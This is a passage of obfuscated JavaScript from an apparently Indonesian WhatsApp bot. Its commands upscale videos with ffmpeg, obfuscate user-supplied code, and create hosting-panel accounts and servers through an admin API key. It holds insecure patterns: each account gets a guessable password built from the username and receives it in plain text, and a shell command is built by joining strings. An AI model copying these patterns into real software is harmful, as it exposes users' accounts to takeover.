                    'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      'buttons': [{
                        'name': "quick_reply",
                        'buttonParamsJson': "{\"display_text\":\"Nice byxx - AI\",\"id\":\".mangap\"}"
                      }]
                    }),
                    'contextInfo': {
                      'mentionedJid': [_0x257ec2.sender],
                      'forwardingScore': 0x3e7,
                      'isForwarded': true,
                      'forwardedNewsletterMessageInfo': {
                        'newsletterJid': '0@newsletter',
                        'newsletterName': namabot,
                        'serverMessageId': 0x8f
                      }
                    }
                  })
                }
              }
            }, {
              'quoted': _0x257ec2
            });
            await _0x488b14.relayMessage(_0x257ec2.chat, _0x4c6316.message, {});
          } catch (_0x58fb04) {
            return _0x2d94c9("Error Kak :(");
          }
        }
        break;
      case "hdvid":
      case 'hdvideo':
      case "vidiohd":
      case "tohd":
      case "vidhd":
        {
          const {
            exec: _0x55fdc2
          } = require("child_process");
          const _0xef13cb = _0x257ec2.quoted ? _0x257ec2.quoted : _0x257ec2;
          const _0x5b94c8 = (_0xef13cb.msg || _0xef13cb).mimetype || '';
          if (!_0x5b94c8) {
            return _0x257ec2.reply("Mana vidio nya bang?");
          }
          _0x2d94c9(mess.wait);
          const _0x1fac93 = await _0x488b14.downloadAndSaveMediaMessage(_0xef13cb);
          _0x55fdc2("ffmpeg -i " + _0x1fac93 + " -s 1280x720 -c:v libx264 -c:a copy " + "output.mp4", (_0xf12e2f, _0x3cb56c, _0x114fbd) => {
            if (_0xf12e2f) {
              console.error("Error: " + _0xf12e2f.message);
              return;
            }
            console.log("stdout: " + _0x3cb56c);
            console.error("stderr: " + _0x114fbd);
            _0x488b14.sendMessage(_0x257ec2.chat, {
              'caption': "_Success To HD Video_",
              'video': {
                'url': "output.mp4"
              }
            }, {
              'quoted': _0x257ec2
            });
          });
          await sleep(0xea60);
          fs.unlinkSync("output.mp4");
          fs.unlinkSync(_0x1fac93);
        }
        break;
      case "enc":
      case "encrypt":
      case 'obfuscate':
        {
          if (!q) {
            return _0x2d94c9("Contoh " + (_0x28d847 + _0x1a8c03) + " const time = require('money')");
          }
          let _0x12c256 = await _0x465ee1(q);
          _0x2d94c9('' + _0x12c256.result);
        }
        break;
      case "1gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x526673 = _0x5592c0.split(',');
          if (_0x526673.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x36edb1 = _0x526673[0x0];
          let _0x1c871e = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x526673[0x1] ? _0x526673[0x1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : _0x257ec2.mentionedJid[0x0];
          let _0x14339b = _0x36edb1 + '1GB';
          let _0x44394a = global.eggsnya;
          let _0x30b55d = global.location;
          let _0x21f068 = _0x36edb1 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x1c871e) {
            return;
          }
          let _0x2a2007 = _0x36edb1 + "001";
          let _0x691a74 = await fetch(domain + '/api/application/users', {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-TyPe': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x21f068,
              'username': _0x36edb1,
              'first_name': _0x36edb1,
              'last_name': _0x36edb1,
              'language': 'en',
              'password': _0x2a2007
            })
          });
          let _0xae4834 = await _0x691a74.json();
          if (_0xae4834.errors) {
            return _0x2d94c9(JSON.stringify(_0xae4834.errors[0x0], null, 0x2));
          }
          let _0x3ec3f3 = _0xae4834.attributes;
          let _0x3a8379 = await fetch(domain + '/api/application/nests/5/eggs/' + _0x44394a, {
            'method': 'GET',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x3ec3f3.id);
          ctf = "Hai @" + _0x1c871e.split`@`[0x0] + "\n\n *👤USERNAME* : " + _0x3ec3f3.username + "\n *🔐PASSWORD* : " + _0x2a2007 + "\n *🌐LOGIN* : " + domain + "\n\nNOTE :\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n";
          _0x488b14.sendMessage(_0x1c871e, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x11263d = await _0x3a8379.json();
          let _0x1244ad = _0x11263d.attributes.startup;
          let _0x1dadcc = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x14339b,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x3ec3f3.id,
              'egg': parseInt(_0x44394a),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x1244ad,
              'environment': {
                'INST': 'npm',
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "1024",
                'swap': 0x0,
                'disk': "1024",
                'io': 0x1f4,
                'cpu': '30'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x30b55d)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x2af9a5 = await _0x1dadcc.json();
          if (_0x2af9a5.errors) {
            return _0x2d94c9(JSON.stringify(_0x2af9a5.errors[0x0], null, 0x2));
          }
        }
        break;
      case '2gb':
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x5f20d7 = _0x5592c0.split(',');
          if (_0x5f20d7.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x4510eb = _0x5f20d7[0x0];
          let _0x12975c = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x5f20d7[0x1] ? _0x5f20d7[0x1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : _0x257ec2.mentionedJid[0x0];
          let _0xe69c5b = _0x4510eb + "2GB";
          let _0x1cff4f = global.eggsnya;
          let _0xe1adbc = global.location;
          let _0x193207 = _0x4510eb + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x12975c) {
            return;
          }
          let _0x4e8189 = _0x4510eb + "001";
          let _0x2b0b18 = await fetch(domain + '/api/application/users', {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x193207,
              'username': _0x4510eb,
              'first_name': _0x4510eb,
              'last_name': _0x4510eb,
              'language': 'en',
              'password': _0x4e8189
            })
          });
          let _0x70db0c = await _0x2b0b18.json();
          if (_0x70db0c.errors) {
            return _0x2d94c9(JSON.stringify(_0x70db0c.errors[0x0], null, 0x2));
          }
          let _0x673439 = _0x70db0c.attributes;
          let _0x286161 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x1cff4f, {
            'method': 'GET',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x673439.id);
          ctf = "Hai @" + _0x12975c.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x673439.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x4e8189 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : *6282291664759*\n=====================================\n";
          _0x488b14.sendMessage(_0x12975c, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x2ffc82 = await _0x286161.json();
          let _0x58f7bf = _0x2ffc82.attributes.startup;
          let _0x48e288 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0xe69c5b,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x673439.id,
              'egg': parseInt(_0x1cff4f),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x58f7bf,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "2048",
                'swap': 0x0,
                'disk': "2048",
                'io': 0x1f4,
                'cpu': '60'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0xe1adbc)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x4cae87 = await _0x48e288.json();
          if (_0x4cae87.errors) {
            return _0x2d94c9(JSON.stringify(_0x4cae87.errors[0x0], null, 0x2));
          }
        }
        break;
      case "3gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x436daf = _0x5592c0.split(',');
          if (_0x436daf.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x20975c = _0x436daf[0x0];
          let _0x2d1d59 = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x436daf[0x1] ? _0x436daf[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x79affa = _0x20975c + "3GB";
          let _0x2b3c4d = global.eggsnya;
          let _0x143a50 = global.location;
          let _0x147a3d = _0x20975c + '1398@gmail.com';
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x2d1d59) {
            return;
          }
          let _0x88e60e = _0x20975c + '001';
          let _0x5cd054 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x147a3d,
              'username': _0x20975c,
              'first_name': _0x20975c,
              'last_name': _0x20975c,
              'language': 'en',
              'password': _0x88e60e
            })
          });
          let _0xc16b31 = await _0x5cd054.json();
          if (_0xc16b31.errors) {
            return _0x2d94c9(JSON.stringify(_0xc16b31.errors[0x0], null, 0x2));
          }
          let _0x414f09 = _0xc16b31.attributes;
          let _0x5d5f69 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2b3c4d, {
            'method': "GET",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x414f09.id);
          ctf = "Hai @" + _0x2d1d59.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x414f09.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x88e60e + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE :\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x2d1d59, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x467c0d = await _0x5d5f69.json();
          let _0x30a978 = _0x467c0d.attributes.startup;
          let _0x3663fa = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x79affa,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x414f09.id,
              'egg': parseInt(_0x2b3c4d),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x30a978,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "3072",
                'swap': 0x0,
                'disk': "3072",
                'io': 0x1f4,
                'cpu': '80'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x143a50)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x5ea085 = await _0x3663fa.json();
          if (_0x5ea085.errors) {
            return _0x2d94c9(JSON.stringify(_0x5ea085.errors[0x0], null, 0x2));
          }
        }
        break;
      case "4gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x37d8b6 = _0x5592c0.split(',');
          if (_0x37d8b6.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x459817 = _0x37d8b6[0x0];
          let _0xd6fa34 = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x37d8b6[0x1] ? _0x37d8b6[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x1ab0aa = _0x459817 + '4';
          let _0x2aeefc = global.eggsnya;
          let _0x11ac67 = global.location;
          let _0x588ccb = _0x459817 + "1398@gmail.com";
          akunlo = 'https://telegra.ph/file/3d91b41617cb982acf0c4.jpg';
          if (!_0xd6fa34) {
            return;
          }
          let _0x3c8284 = _0x459817 + "001";
          let _0x5fb331 = await fetch(domain + '/api/application/users', {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x588ccb,
              'username': _0x459817,
              'first_name': _0x459817,
              'last_name': _0x459817,
              'language': 'en',
              'password': _0x3c8284
            })
          });
          let _0x3e5a2a = await _0x5fb331.json();
          if (_0x3e5a2a.errors) {
            return _0x2d94c9(JSON.stringify(_0x3e5a2a.errors[0x0], null, 0x2));
          }
          let _0x445cdd = _0x3e5a2a.attributes;
          let _0x3301e0 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2aeefc, {
            'method': "GET",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x445cdd.id);
          ctf = "Hai @" + _0xd6fa34.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x445cdd.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x3c8284 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0xd6fa34, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x1e7ca7 = await _0x3301e0.json();
          let _0x215533 = _0x1e7ca7.attributes.startup;
          let _0x5800f3 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x1ab0aa,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x445cdd.id,
              'egg': parseInt(_0x2aeefc),
              'docker_image': 'ghcr.io/parkervcp/yolks:nodejs_18',
              'startup': _0x215533,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '4048',
                'swap': 0x0,
                'disk': "4000",
                'io': 0x1f4,
                'cpu': "100"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x11ac67)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0xf5d390 = await _0x5800f3.json();
          if (_0xf5d390.errors) {
            return _0x2d94c9(JSON.stringify(_0xf5d390.errors[0x0], null, 0x2));
          }
        }
        break;
      case "unli":
        {
          if (!_0x14f0d6) {
            return _0x2d94c9("𝐔𝐝𝐚𝐡 𝐁𝐢𝐬𝐚 𝐂𝐫𝐞𝐚𝐭𝐞 𝐒𝐚𝐦𝐩𝐞 𝟐𝟓𝐆𝐁, 𝐌𝐚𝐬𝐢 𝐍𝐠𝐞𝐥𝐮𝐧𝐣𝐚𝐤 𝐂𝐫𝐞𝐚𝐭𝐞 𝐔𝐧𝐥𝐢 🗿 !");
          }
          let _0x2adb41 = _0x5592c0.split(',');
          if (_0x2adb41.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x1c060a = _0x2adb41[0x0];
          let _0x36a76c = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x2adb41[0x1] ? _0x2adb41[0x1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : _0x257ec2.mentionedJid[0x0];
          let _0x43955f = _0x1c060a + "Unli";
          let _0x2ee24c = global.eggsnya;
          let _0x3f0e81 = global.location;
          let _0x2b59f1 = _0x1c060a + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x36a76c) {
            return;
          }
          let _0x48933d = _0x1c060a + "001";
          let _0x4f5a23 = await fetch(domain + '/api/application/users', {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x2b59f1,
              'username': _0x1c060a,
              'first_name': _0x1c060a,
              'last_name': _0x1c060a,
              'language': 'en',
              'password': _0x48933d
            })
          });
          let _0x299e58 = await _0x4f5a23.json();
          if (_0x299e58.errors) {
            return _0x2d94c9(JSON.stringify(_0x299e58.errors[0x0], null, 0x2));
          }
          let _0x22a9dd = _0x299e58.attributes;
          let _0x1a8991 = await fetch(domain + '/api/application/nests/5/eggs/' + _0x2ee24c, {
            'method': 'GET',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x22a9dd.id);
          ctf = "Hai @" + _0x36a76c.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x22a9dd.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x48933d + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x36a76c, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x36a612 = await _0x1a8991.json();
          let _0x180c91 = _0x36a612.attributes.startup;
          let _0x54d5b2 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x43955f,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x22a9dd.id,
              'egg': parseInt(_0x2ee24c),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x180c91,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '0',
                'swap': 0x0,
                'disk': '0',
                'io': 0x1f4,
                'cpu': '0'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x3f0e81)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x485ec6 = await _0x54d5b2.json();
          if (_0x485ec6.errors) {
            return _0x2d94c9(JSON.stringify(_0x485ec6.errors[0x0], null, 0x2));
          }
        }
        break;
      case '5gb':
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x3493c6 = _0x5592c0.split(',');
          if (_0x3493c6.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x2ee8cb = _0x3493c6[0x0];
          let _0x5056b4 = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x3493c6[0x1] ? _0x3493c6[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x4adbe3 = _0x2ee8cb + "5GB";
          let _0x383d13 = global.eggsnya;
          let _0x32660a = global.location;
          let _0x485d0d = _0x2ee8cb + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x5056b4) {
            return;
          }
          let _0x3a772e = _0x2ee8cb + "0011";
          let _0x556f7b = await fetch(domain + "/api/application/users", {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x485d0d,
              'username': _0x2ee8cb,
              'first_name': _0x2ee8cb,
              'last_name': _0x2ee8cb,
              'language': 'en',
              'password': _0x3a772e
            })
          });
          let _0x11dc8c = await _0x556f7b.json();
          if (_0x11dc8c.errors) {
            return _0x2d94c9(JSON.stringify(_0x11dc8c.errors[0x0], null, 0x2));
          }
          let _0x46dd11 = _0x11dc8c.attributes;
          let _0x7636ed = await fetch(domain + "/api/application/nests/5/eggs/" + _0x383d13, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x46dd11.id);
          ctf = "Hai @" + _0x5056b4.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x46dd11.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x3a772e + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x5056b4, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x55eeea = await _0x7636ed.json();
          let _0x28d9fd = _0x55eeea.attributes.startup;
          let _0x435e0c = await fetch(domain + '/api/application/servers', {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x4adbe3,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x46dd11.id,
              'egg': parseInt(_0x383d13),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x28d9fd,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "5138",
                'swap': 0x0,
                'disk': '5138',
                'io': 0x1f4,
                'cpu': '120'
              },
              'feature_limits': {
                'databases': 0x5,
